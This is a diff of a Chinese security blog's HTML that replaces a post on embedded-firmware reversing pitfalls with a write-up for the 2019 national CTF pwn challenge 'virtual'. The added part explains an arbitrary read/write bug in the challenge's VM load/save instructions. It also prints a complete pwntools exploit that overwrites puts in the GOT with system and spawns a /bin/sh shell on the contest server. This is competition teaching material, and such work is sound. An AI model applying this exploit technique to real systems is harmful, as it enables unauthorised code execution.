@@ -15,18 +15,22 @@
 
 
 
-<meta name="description" content="谨以本文纪念这几个月因为踩坑浪费的时间">
-<meta name="keywords" content="reverse,摸鱼">
+<meta name="description" content="周末(日)打了国赛，本来周六没打就想划了，后来还是打了一下。主要做了一下virtual这题，还挺有意思的。">
+<meta name="keywords" content="pwn,ctf,2019 国赛,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="嵌入式安全踩过的坑(持续更新)">
-<meta property="og:url" content="http://850.world/2019/03/18/IOT-security-re/index.html">
+<meta property="og:title" content="2019国赛 virtual writeup">
+<meta property="og:url" content="http://850.world/2019/04/22/byctf2019-virtual/index.html">
 <meta property="og:site_name" content="850&#39;s World">
-<meta property="og:description" content="谨以本文纪念这几个月因为踩坑浪费的时间">
+<meta property="og:description" content="周末(日)打了国赛，本来周六没打就想划了，后来还是打了一下。主要做了一下virtual这题，还挺有意思的。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-21T06:30:08.841Z">
+<meta property="og:image" content="http://850.world/img/img_byctf2019_0.jpg">
+<meta property="og:image" content="http://850.world/img/img_byctf2019_1.png">
+<meta property="og:image" content="http://850.world/img/img_byctf2019_2.png">
+<meta property="og:updated_time" content="2019-04-22T02:08:12.818Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="嵌入式安全踩过的坑(持续更新)">
-<meta name="twitter:description" content="谨以本文纪念这几个月因为踩坑浪费的时间">
+<meta name="twitter:title" content="2019国赛 virtual writeup">
+<meta name="twitter:description" content="周末(日)打了国赛，本来周六没打就想划了，后来还是打了一下。主要做了一下virtual这题，还挺有意思的。">
+<meta name="twitter:image" content="http://850.world/img/img_byctf2019_0.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -58,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>嵌入式安全踩过的坑(持续更新) | 850&#39;s World</title>
+<title>2019国赛 virtual writeup | 850&#39;s World</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -252,11 +256,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-IOT-security-re" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-byctf2019-virtual" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/18/IOT-security-re/" class="article-date">
-      <time datetime="2019-03-18T03:08:56.000Z" itemprop="datePublished">2019-03-18</time>
+      <a href="/2019/04/22/byctf2019-virtual/" class="article-date">
+      <time datetime="2019-04-22T01:26:02.000Z" itemprop="datePublished">2019-04-22</time>
 </a>
 
 
@@ -271,7 +275,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      嵌入式安全踩过的坑(持续更新)
+      2019国赛 virtual writeup
     </h1>
   
 
@@ -282,7 +286,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/摸鱼/">摸鱼</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2019-国赛/">2019 国赛</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -292,23 +296,29 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>谨以本文纪念这几个月因为踩坑浪费的时间<br><a id="more"></a><br>俗话说得好，摸鱼一时爽，一直摸鱼一直爽。从去年年前开始搞ssd固件逆向，然后陆续搞了搞PLC固件逆向和NAS固件逆向，很不幸的是，一样也没搞出来。让人很有一些挫败的感觉。在踩坑的过程中，终于体会到为什么说硬件黑客最nb这个说法是怎么来的了。焊板子，焊线什么的真是太硬核了。为了避免以后继续踩雷，同时提醒自己以后不能再蠢了，这里记录一下这两个月来所有遇到的坑。</p>
-<h2 id="实践操作层面"><a href="#实践操作层面" class="headerlink" title="实践操作层面"></a>实践操作层面</h2><ol>
-<li>撕开导线的绝缘膜去抽铜丝的时候不要撕得太多，不然容易几根细丝搭到一起引起短路。（插头一插上去及其爽感）</li>
-<li>JTAG口一般来说是留了两排孔用来插排针的。不要去奇奇怪怪的地方想些有的没的</li>
-<li>仿真器一般是20pin的，14pin，10pin需要用转接板</li>
-<li>SATA接口其实分为两个部分，短一点的是ATA接口，长一点的是电源线。旁边的是跳线，一般不用管。</li>
-<li>看不懂PCB板上的电路真的很麻烦。硬件黑客nb！</li>
-</ol>
-<h2 id="逆向层面"><a href="#逆向层面" class="headerlink" title="逆向层面"></a>逆向层面</h2><ol>
-<li>没有芯片手册去逆固件会遇到加载地址不知道的问题</li>
-<li>arm架构通过字符串引用可以找到部分加载地址，但是无法找全</li>
-<li>JTAG调试接口可以帮助动态调试。</li>
-<li>OPENOCD + JTAG + GDB 可以动态调试。</li>
-<li>可以通过下载固件更新包的方法获取固件。目前为止能够下载的固件更新包里只有ABB的是经过了加密的。</li>
-<li>OpenOCD 要选仿真器，Jlink要在cfg文件里加一个<code>adapter_khz</code>然后还要写<code>jlink serial</code>。还要选芯片，marvell的芯片只有<code>88f37x0</code> 么得我要的。</li>
-<li>Trace32看起来很屌的样子。</li>
-</ol>
+        <p>周末(日)打了国赛，本来周六没打就想划了，后来还是打了一下。主要做了一下virtual这题，还挺有意思的。<br><a id="more"></a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先拿到binary，先拖进ida，发现是一个类似虚拟机的东西，实现了几个指令，分别是</p>
+<ul>
+<li><code>push</code></li>
+<li><code>pop</code></li>
+<li><code>add</code></li>
+<li><code>sub</code></li>
+<li><code>mul</code></li>
+<li><code>div</code></li>
+<li><code>load</code></li>
+<li><code>save</code><br>通过分析逻辑发现，程序维护了三个栈，三个栈的结构如图所示：<br><img src="/img/img_byctf2019_0.jpg" alt=""><br>其中，三个栈分别为：指令栈，数据栈，运行时栈。有问题的是<code>load</code>,<code>save</code>指令。<br>load:<br><img src="/img/img_byctf2019_1.png" alt=""></li>
+</ul>
+<p>save:</p>
+<p><img src="/img/img_byctf2019_2.png" alt=""></p>
+<p>这两个指令没有对写入和载入的地址做判断，因此可以任意地址读写。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>这题主要有两个难点，一个是没有leak。整个程序只有一次输出，因此无法通过leak来知道堆地址、栈地址、libc基址等(虽然也不需要)。所以这里我们采用类似ROP中<code>adc gadget</code>的方法来进行利用。由于没有告诉我们libc版本，因此可以先采用程序的输出来leak libc版本，之后就好办了。还有一个难点就是函数逻辑比较绕，最后<code>save</code>操作先取地址再取值，因此需要和数据栈再配合一下。最终的payload如下：</p>
+<ul>
+<li>Instructions: <code>push push push push push push push load div add pop load div add load add push save</code></li>
+<li>Data: <code>offset(system-puts) 0x404020/8 -8 -6 0x404020/8+1 -8 -9</code></li>
+<li>name: <code>/bin/sh</code></li>
+</ul>
+<p>这里稍微解释一下流程，前面几个<code>push</code>不用解释，就是把数据栈中的数据压入运行栈。由于<code>save</code>函数的流程是先取地址的，因此我们先计算地址。第一个<code>load</code>是load了当前栈中的数据在堆上的地址，然后通过<code>add</code>抵消了寻址时的地址，这边就计算出了<code>save</code>时需要的地址的值，然后<code>pop</code>出来，继续计算。第二个<code>load</code>同理先load自己，然后通过计算就能load<code>got</code>表中<code>0x404020</code>这个位置存放的值了，这就是<code>puts</code>的实际地址。然后通过<code>add</code>指令将偏移加到结果上，这样得到了目标值，接下来只要通过<code>save</code>指令将结果写到got表就好了。</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: 850@[AAA,s^2,BIXOH]</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pwn script framework</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BASE</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        initial basic paramaters</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.rhost = remote_host</span><br><span class="line">        self.rport = remote_port</span><br><span class="line">        self.elf_name = local_elf</span><br><span class="line">        self.gdb_scripts = gdb_script</span><br><span class="line">        self.local_libc = _local_libc</span><br><span class="line">        self.remote_libc = _remote_libc</span><br><span class="line">        context(os=<span class="string">'linux'</span>, log_level=_log_level)</span><br><span class="line">        context(terminal=[<span class="string">"xfce4-terminal"</span>, <span class="string">"-e"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">local_debug</span><span class="params">(self, gdb_attach)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        debug with GDB</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.target = process(self.elf_name)</span><br><span class="line">        self.one_gadget_addr = <span class="number">0x45254</span></span><br><span class="line">        self.elf = ELF(self.elf_name)</span><br><span class="line">        self.libc = ELF(self.local_libc)</span><br><span class="line">        <span class="keyword">if</span> gdb_attach:</span><br><span class="line">            gdb.attach(self.target, gdbscript=self.gdb_scripts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remote_attack</span><span class="params">(self,)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        remote exploit</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.libc = ELF(self.remote_libc)</span><br><span class="line">        self.one_gadget_addr = <span class="number">0xf02a4</span></span><br><span class="line">        self.target = remote(self.rhost, self.rport)</span><br><span class="line">        self.elf = ELF(self.elf_name)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,)</span>:</span></span><br><span class="line">        <span class="comment"># self.local_debug(gdb_attach=False)</span></span><br><span class="line">        self.remote_attack()</span><br><span class="line">        <span class="comment"># offset = self.one_gadget_addr - self.libc.symbols['puts'] </span></span><br><span class="line">        offset = self.libc.symbols[<span class="string">'system'</span>] - self.libc.symbols[<span class="string">'puts'</span>] </span><br><span class="line">        instructions = [<span class="string">"push "</span>*<span class="number">7</span>,<span class="string">"load"</span>, <span class="string">"div"</span>, <span class="string">"add"</span> ,<span class="string">"pop"</span>,<span class="string">"load"</span>,<span class="string">"div"</span>,<span class="string">"add"</span>,<span class="string">"load"</span>,<span class="string">"add"</span>,<span class="string">"push"</span>,<span class="string">"save"</span>]</span><br><span class="line">        data = [offset,<span class="number">0x404020</span>/<span class="number">8</span>, <span class="number">-8</span>, <span class="number">-6</span>, <span class="number">0x404020</span>/<span class="number">8</span>+<span class="number">1</span>, <span class="number">-8</span>, <span class="number">-9</span>]</span><br><span class="line">        tmp=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            tmp.append(str(i))</span><br><span class="line">        <span class="keyword">print</span> tmp</span><br><span class="line">        self.target.sendlineafter(<span class="string">"Your program name:"</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"Your instruction:"</span>, <span class="string">" "</span>.join(instructions))</span><br><span class="line">        self.target.sendlineafter(<span class="string">"Your stack data:"</span>, <span class="string">" "</span>.join(tmp))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.target.recvuntil("Fuck")</span></span><br><span class="line">        <span class="comment"># self.target.recvline()</span></span><br><span class="line">        <span class="comment"># free_addr = int(self.target.recvline())</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print "free_addr: "+hex(free_addr)</span></span><br><span class="line">        self.target.interactive()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"done"</span></span><br><span class="line"></span><br><span class="line">solve = BASE(</span><br><span class="line">    remote_host=<span class="string">"a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com"</span>,</span><br><span class="line">    remote_port= <span class="number">40003</span>,</span><br><span class="line">    local_elf=<span class="string">"./virtual"</span>,</span><br><span class="line">    _remote_libc=<span class="string">"./libc6.so"</span>,</span><br><span class="line">    _local_libc=<span class="string">"/lib64/libc.so.6"</span>,</span><br><span class="line">    gdb_script=<span class="string">"b *0x401d37\nb *0x401d98\nb * 0x401cce"</span>,</span><br><span class="line">    _log_level=<span class="string">"debug"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> solve.run()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -317,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/18/IOT-security-re/">嵌入式安全踩过的坑(持续更新)</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/22/byctf2019-virtual/">2019国赛 virtual writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">850</a></p>
-        <p><span>发布时间:</span>2019-03-18, 11:08:56</p>
-        <p><span>最后更新:</span>2019-03-21, 14:30:08</p>
+        <p><span>发布时间:</span>2019-04-22, 09:26:02</p>
+        <p><span>最后更新:</span>2019-04-22, 10:08:12</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/18/IOT-security-re/" title="嵌入式安全踩过的坑(持续更新)">http://850.world/2019/03/18/IOT-security-re/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://850.world/2019/03/18/IOT-security-re/　　作者: 850" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/22/byctf2019-virtual/" title="2019国赛 virtual writeup">http://850.world/2019/04/22/byctf2019-virtual/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://850.world/2019/04/22/byctf2019-virtual/　　作者: 850" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -335,16 +345,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/04/22/byctf2019-virtual/">
-                    2019国赛 virtual writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/12/31/35c3Junior/">
-                    35c3CTF-Junior 两/三道pwn writeup
+                <a href="/2019/03/18/IOT-security-re/">
+                    嵌入式安全踩过的坑(持续更新)
                 </a>
             </div>
         
@@ -356,7 +360,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实践操作层面"><span class="toc-number">1.</span> <span class="toc-text">实践操作层面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逆向层面"><span class="toc-number">2.</span> <span class="toc-text">逆向层面</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路"><span class="toc-number">2.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">3.</span> <span class="toc-text">脚本</span></a></li></ol>
         
     </div>
     <style>
@@ -392,7 +396,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"嵌入式安全踩过的坑(持续更新)　| 850's World　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"2019国赛 virtual writeup　| 850's World　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -411,8 +415,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://850.world/2019/03/18/IOT-security-re/';
-            this.page.identifier = '2019/03/18/IOT-security-re/';
+            this.page.url = 'http://850.world/2019/04/22/byctf2019-virtual/';
+            this.page.identifier = '2019/04/22/byctf2019-virtual/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -434,15 +438,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/04/22/byctf2019-virtual/" title="上一篇: 2019国赛 virtual writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/12/31/35c3Junior/" title="下一篇: 35c3CTF-Junior 两/三道pwn writeup">
+            <a href="/2019/03/18/IOT-security-re/" title="下一篇: 嵌入式安全踩过的坑(持续更新)">
                 <i class="fa fa-angle-right"></i>
             </a>
         
